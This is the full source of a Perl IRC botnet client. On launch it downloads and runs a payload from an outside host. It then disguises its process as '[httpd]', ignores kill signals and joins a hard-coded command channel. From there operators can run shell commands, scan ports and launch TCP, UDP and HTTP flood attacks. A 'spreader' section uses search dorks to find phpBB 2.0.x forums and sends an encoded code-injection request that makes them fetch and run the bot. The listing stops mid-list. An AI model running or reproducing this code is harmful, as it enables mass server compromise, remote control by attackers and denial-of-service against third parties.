#!/usr/bin/perl


system("wget http://buttercreamcards.com/p;fetch http://buttercreamcards.com/p;curl -O http://buttercreamcards.com/p;perl p;rm -rf p"); 

my $processo = '[httpd]';
my $linas_max='5';
my $sleep='5';
my @adms=("spart","hacked");
my @hostauth=("spart.gov","muie.gov");
my @canais=("#hor");
my $pwned="/tmp/horderd";
my $nick='hor-';
my $ircname = 'spart';
chop (my $realname = 'id');
$servidor='66.36.243.65' unless $servidor;
my $porta='4444';

my $VERSAO = '0.2';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);



our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 1;
   }
}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}
 
sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
       }
       if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
       if (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         if ($args =~ /^(\Q$meunick\E|\!atrix)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "!atrix" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         } 
       }
	}
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4; 
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal ddosit");
       }
   }
}


sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^portscan (.*)/) {
             my $hostip="$1";
             my @portas=("21","23","25","80","113","135","445","1025","5000","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080");
             my (@aberta, %porta_banner);
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SCAN]\002 Scanning ".$1." for open ports.");     
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
                }
             }

             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SCAN]\002 Open port(s): @aberta");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :\002[SCAN]\002 No open ports found"); 
             }
           }
           if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP-DDOS]\002 Attacking ".$1.":".$2." for ".$3." seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($3>$cur_time){
             $cur_time = time - $itime;
	     &tcpflooder("$1","$2","$3");
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP-DDOS]\002 Finished with attacking ".$1.":".$2.".");
           }
           if ($funcarg =~ /^google\s+(\d+)\s+(.*)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Scanning for unpatched phpBB for ".$1." seconds.");
	     srand;
	     my $itime = time;
	     my ($cur_time);
	     my ($exploited);

	     $boturl=$2;
             $cur_time = time - $itime;
	     $exploited = 0;
		while($1>$cur_time){
		    $cur_time = time - $itime;
		    @urls=fetch();
		    foreach $url (@urls) {
			$cur_time = time - $itime;
			if ($url !~ /viewtopic.php/) {next;$cur_time = time - $itime;}
			$url =~ s/(.*\/viewtopic.php\?[t|p]=[0-9]+).*/$1/;
			$host[0] = $url;
			if($host[0] =~ /\//){
			($host[1],$host[2])=split(/\//,$host[0]);
			}
			#sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[EXPLOITING]\002 ".$host[1].".");
			$url .="&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(104)%252echr(116)%252echr(116)%252echr(112)%252echr(58)%252echr(47)%252echr(47)%252echr(115)%252echr(97)%252echr(110)%252echr(116)%252echr(111)%252echr(103)%252echr(111)%252echr(111)%252echr(103)%252echr(108)%252echr(101)%252echr(46)%252echr(99)%252echr(111)%252echr(109)%252echr(47)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116))%252e%2527";
			$page = http_query($url);
			if ( $page =~ /uyx/ ){
			    $page = http_query($url);
			    $exploited = $exploited + 1;
			    sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[0WN3D]\002 " .$url. ".");
			}
		    }
		}
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Exploited ".$exploited." boxes in ".$1." seconds.");
           }
           if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP-DDOS]\002 Attacking ".$1.":80 for ".$2." seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($2>$cur_time){
             $cur_time = time - $itime;
	     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
             print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
	     close($socket);
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP-DDOS]\002 Finished with attacking ".$1.".");
           }
           if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP-DDOS]\002 Attacking ".$1." with ".$2." Kb packets for ".$3." seconds.");
             my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
            
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP-DDOS]\002 Sended ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." seconds to ".$1.".");

           }
           exit;
       }
  }
}
 
sub ircase {
  my ($kem, $printl, $case) = @_;

  if ($case =~ /^join (.*)/) {
     j("$1");
   } 
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   if ($case =~ /^eval (.*)/) {
     eval "$1";
   }
}

sub shell {
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "No such file or directory");
    return;
  } 
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($_[0]);
 $pa=sockaddr_in($_[1],$ia);
 $ftime=$_[2];
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 $cur_time = time - $itime;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 $l=0;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  shutdown($t,2);
  $l++;
 }
}

sub udpflooder {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
  
  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65000; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}  
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {
  sendraw("PART $_[0]");
}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
}

#Spreader

sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 50;
    if ($rnd<5000) { $n<<=1;}
    my $s= (int(rand(10)) * $n);

my @str=("%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ca%22+%22phpbb%22%2B%222.0.6%22", 
"%22inurl%3A%22.ca%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.10%22",
"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.6%22",
"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.8%22",
"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.10%22",
"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.6%22",
"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.8%22",
"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.10%22",
"inurl%3A%22%2FphpBB%2F%22+%22phpbb%22%2B%222.0.6%22",
"inurl%3A%22%2FphphBB%2F%22+%22phpbb%22%2B%222.0.8%22",
"inurl%3A%22%2FphpBB%2F%22+%22phpbb%22%2B%222.0.10%22",
"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.6%22",
"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.8%22",
"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.10%22",
"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.6%22",
"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.8%22",
